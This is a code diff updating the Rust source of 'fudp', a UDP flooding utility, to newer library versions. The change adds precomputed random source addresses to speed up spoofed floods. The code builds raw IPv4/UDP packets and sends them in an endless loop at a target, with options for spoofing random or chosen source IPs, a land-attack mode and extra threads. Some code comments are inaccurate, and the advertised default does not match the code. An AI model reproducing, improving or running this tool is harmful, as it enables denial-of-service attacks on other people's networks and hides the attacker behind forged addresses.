@@ -1,76 +1,93 @@
-#[macro_use]
-extern crate clap;
 extern crate pnet;
 extern crate rand;
 extern crate spin_sleep;
 
-use rand::Rng;
-use std::str::FromStr;
-use clap::{App, Arg};
-use std::net::{IpAddr, Ipv4Addr};
-use pnet::transport;
-use pnet::packet::ip::IpNextHeaderProtocols;
+use clap::{Arg, ArgAction, Command};
 use pnet::packet;
 use pnet::packet::Packet;
-use pnet::packet::MutablePacket;
+use pnet::packet::ip::IpNextHeaderProtocols;
+use pnet::transport;
+use rand::{Rng, RngCore};
+use std::net::{IpAddr, Ipv4Addr};
+use std::str::FromStr;
 
 fn main() {
-    let matches = App::new("fudp")
+    let matches = Command::new("fudp")
         .before_help("Please use responsibly")
-        .version(format!("v{}", crate_version!()).as_ref())
+        .version(env!("CARGO_PKG_VERSION"))
         .author("xorrsprsp - https://github.com/xorrsprsp/")
         .about("fudp is a simple and very easy to use UDP flooding utility")
         .arg(
-            Arg::with_name("dst-ip")
+            Arg::new("dst-ip")
                 .help("The IP to be targeted")
-                .required(true),
+                .required(true)
+                .index(1),
         )
         .arg(
-            Arg::with_name("single-packet")
-                .short("1")
-                .help("Sends a single datagram and then exits"),
+            Arg::new("single-packet")
+                .short('1')
+                .help("Sends a single datagram and then exits")
+                .action(ArgAction::SetTrue),
         )
         .arg(
-            Arg::with_name("random-src")
-                .short("r")
-                .help("Spoofs a random sender IP"),
+            Arg::new("random-src")
+                .short('r')
+                .help("Spoofs a random sender IP")
+                .action(ArgAction::SetTrue),
         )
         .arg(
-            Arg::with_name("threads")
-                .short("i")
+            Arg::new("threads")
+                .short('i')
                 .help("Spin up extra threads generating datagrams")
-                .takes_value(true),
+                .value_name("THREADS")
+                .num_args(1),
         )
         .arg(
-            Arg::with_name("dst-port")
-                .short("p")
+            Arg::new("dst-port")
+                .short('p')
                 .help("Destination port")
-                .takes_value(true),
+                .value_name("PORT")
+                .num_args(1),
         )
         .arg(
-            Arg::with_name("payload-size")
-                .short("z")
+            Arg::new("payload-size")
+                .short('z')
                 .help("UDP payload size (Default: 0; Empty packets)")
-                .takes_value(true),
+                .value_name("SIZE")
+                .num_args(1),
         )
         .arg(
-            Arg::with_name("src-ip")
-                .short("s")
+            Arg::new("src-ip")
+                .short('s')
                 .help("Spoofs a specified source IP")
-                .takes_value(true),
+                .value_name("IP")
+                .num_args(1),
         )
         .arg(
-            Arg::with_name("delay")
-                .short("d")
+            Arg::new("delay")
+                .short('d')
                 .help("Sleeps the thread for the specified time in μs before sending a new packet (Default: 0μs)")
-                .takes_value(true),
+                .value_name("MICROSECONDS")
+                .num_args(1),
         )
-        .arg(Arg::with_name("land-attack").short("l").help("Land Attack"))
+        .arg(
+            Arg::new("land-attack")
+                .short('l')
+                .help("Land Attack")
+                .action(ArgAction::SetTrue),
+        )
+        .arg(
+            Arg::new("precompute-random-IPs")
+                .short('c')
+                .help("Precompute a number of random IPs (Default: 4'000'000 IPs)")
+                .value_name("IPs")
+                .num_args(1)
+        )
         .get_matches();
 
-    let dst_ip = matches.value_of("dst-ip").unwrap();
+    let dst_ip = matches.get_one::<String>("dst-ip").unwrap();
 
-    let src_ip = match matches.value_of("src-ip") {
+    let src_ip = match matches.get_one::<String>("src-ip") {
         Some(source_ip) => match Ipv4Addr::from_str(source_ip) {
             Ok(ip) => ip,
             Err(err) => {
@@ -81,7 +98,7 @@ fn main() {
         None => Ipv4Addr::new(0, 0, 0, 0),
     };
 
-    let mut dst_port = match matches.value_of("dst-port") {
+    let mut dst_port = match matches.get_one::<String>("dst-port") {
         Some(destination_port) => match destination_port.parse::<u16>() {
             Ok(port) => port,
             Err(err) => {
@@ -92,7 +109,7 @@ fn main() {
         None => 0u16,
     };
 
-    let payload_size = match matches.value_of("payload-size") {
+    let payload_size = match matches.get_one::<String>("payload-size") {
         Some(size) => match size.parse::<u16>() {
             Ok(size) => size,
             Err(err) => {
@@ -103,8 +120,8 @@ fn main() {
         None => 0,
     };
 
-    let random_src = matches.is_present("random-src");
-    let single_packet = matches.is_present("single-packet");
+    let random_src = matches.get_flag("random-src");
+    let single_packet = matches.get_flag("single-packet");
 
     let dst_ip = match Ipv4Addr::from_str(dst_ip) {
         Ok(ip) => ip,
@@ -114,8 +131,9 @@ fn main() {
         }
     };
 
-    let delay_enabled = matches.is_present("delay");
-    let delay = match matches.value_of("delay") {
+    // Fix: check if the delay option is present using contains_id instead of get_flag
+    let delay_enabled = matches.contains_id("delay");
+    let delay = match matches.get_one::<String>("delay") {
         Some(delay) => match delay.parse::<u64>() {
             Ok(delay) => delay,
             Err(err) => {
@@ -128,7 +146,7 @@ fn main() {
 
     let delay_micro = delay * 1000;
 
-    if !src_ip.is_unspecified() && random_src == true {
+    if !src_ip.is_unspecified() && random_src {
         eprintln!("ERROR: -s and -r flags are mutually exclusive");
         std::process::exit(1);
     }
@@ -141,12 +159,31 @@ fn main() {
         Err(e) => panic!("{}", e),
     };
 
-    let mut rng = rand::thread_rng();
+    // Fix: Use thread_rng instead of rng
+    let mut rng = rand::rng();
 
-    let random_src_port = rng.gen::<u16>();
+    // Before the main loop
+    let ip_addresses = match matches.get_one::<String>("precompute-random-IPs") {
+        None => 1_000_000,
+        Some(ip_addresses) => match ip_addresses.parse::<usize>() {
+            Ok(ip_addresses) => ip_addresses,
+            Err(err) => {
+                println!("Error while setting precomputed random bytes: {}", err);
+                std::process::exit(1);
+            }
+        },
+    };
 
-    if !matches.is_present("dst-port") {
-        let random_dst_port = rng.gen::<u16>();
+    let mut random_bytes = vec![0u8; ip_addresses * 4]; // 4 bytes per IPv4 address
+    rng.fill_bytes(&mut random_bytes);
+
+    // Generate a random u16 for source port
+    let random_src_port = rng.random::<u16>();
+
+    // Fix: check for dst-port using contains_id instead of get_flag
+    if !matches.contains_id("dst-port") {
+        // Generate a random u16 for destination port
+        let random_dst_port = rng.random::<u16>();
         dst_port = random_dst_port;
     }
 
@@ -183,7 +220,6 @@ fn main() {
     };
 
     let mut ipv4_buffer = vec![0u8; 20 + udp_buffer_len as usize];
-    let mut buffer_clone = ipv4_buffer.clone();
 
     let mut ipv4_packet = packet::ipv4::MutableIpv4Packet::new(&mut ipv4_buffer).unwrap();
 
@@ -192,37 +228,57 @@ fn main() {
     ipv4_packet.set_payload(udp_packet.packet());
 
     let spin_sleeper = spin_sleep::SpinSleeper::new(100_000_000);
-
+    let mut batch_index: usize = 0;
     if single_packet {
-        send_packets(&mut rng, &mut tx, dst_ip, &mut buffer_clone, random_src, &ipv4_packet);
-    } else if delay_enabled {
-        loop {
-            send_packets(&mut rng, &mut tx, dst_ip, &mut buffer_clone, random_src, &ipv4_packet);
-
-            if delay_enabled {
-                spin_sleeper.sleep_ns(delay_micro);
-            }
+        send_packets(
+            &mut tx,
+            dst_ip,
+            random_src,
+            &mut ipv4_packet,
+            batch_index,
+            &mut random_bytes,
+        );
+        return;
+    }
+    
+    loop {
+        send_packets(
+            &mut tx,
+            dst_ip,
+            random_src,
+            &mut ipv4_packet,
+            batch_index,
+            &mut random_bytes,
+        );
+        batch_index = (batch_index + 1) % ip_addresses;
+        if batch_index == 0 {
+            rng.fill_bytes(&mut random_bytes);
         }
-    } else {
-        loop {
-            send_packets(&mut rng, &mut tx, dst_ip, &mut buffer_clone, random_src, &ipv4_packet);
+        if delay_enabled {
+            spin_sleeper.sleep_ns(delay_micro);
         }
     }
 }
 
-fn send_packets(rng: &mut rand::ThreadRng, tx: &mut pnet::transport::TransportSender, dst_ip: Ipv4Addr,mut buffer_clone: &mut Vec<u8>, random_src: bool, ipv4_packet: &packet::ipv4::MutableIpv4Packet) {
-    let mut cloned_packet = packet::ipv4::MutableIpv4Packet::new(&mut buffer_clone).unwrap();
-    //cloned_packet.clone_from(&ipv4_packet);
-
+fn send_packets(
+    tx: &mut pnet::transport::TransportSender,
+    dst_ip: Ipv4Addr,
+    random_src: bool,
+    ipv4_packet: &mut pnet::packet::ipv4::MutableIpv4Packet,
+    batch_index: usize,
+    random_bytes: &mut Vec<u8>,
+) {
     if random_src {
+        // Generate random IP octets
+        let idx = batch_index * 4;
         let random_ipv4_addr = Ipv4Addr::new(
-            rng.gen::<u8>(),
-            rng.gen::<u8>(),
-            rng.gen::<u8>(),
-            rng.gen::<u8>(),
+            random_bytes[idx],
+            random_bytes[idx + 1],
+            random_bytes[idx + 2],
+            random_bytes[idx + 3],
         );
-        cloned_packet.set_source(random_ipv4_addr);
+        ipv4_packet.set_source(random_ipv4_addr);
     }
 
-    let _result = tx.send_to(ipv4_packet, IpAddr::V4(dst_ip));
+    let _result = tx.send_to(&*ipv4_packet, IpAddr::V4(dst_ip));
 }
